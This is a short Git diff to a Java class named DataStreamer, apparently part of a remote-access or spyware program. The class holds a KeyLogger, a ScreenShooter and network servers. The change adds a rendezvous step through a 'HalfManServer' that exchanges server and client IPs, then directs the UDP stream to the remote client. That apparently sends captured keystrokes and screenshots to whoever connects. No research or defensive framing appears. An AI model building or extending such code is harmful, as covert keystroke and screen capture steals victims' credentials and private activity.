@@ -1,5 +1,6 @@
 package model.program;
 
+import model.connection.HalfManServer;
 import model.connection.UDPServer;
 import model.connection.TCPServer;
 
@@ -14,13 +15,16 @@ public class DataStreamer {
     private KeyLogger Logger;
     private ScreenShooter Shooter;
     private TCPServer TCPServer;
-    private model.connection.UDPServer UDPServer;
+    private UDPServer UDPServer;
+    private String ClientIP;
 
-    public DataStreamer() throws AWTException, SocketException, UnknownHostException {
+    public DataStreamer() throws AWTException, IOException {
+        HalfManServer.sendServerIP();
+        ClientIP = HalfManServer.getClientIP();
         Logger = new KeyLogger();
         Shooter = new ScreenShooter();
         TCPServer = new TCPServer();
-        UDPServer = new UDPServer();
+        UDPServer = new UDPServer(ClientIP);
     }
 
     public void run(){
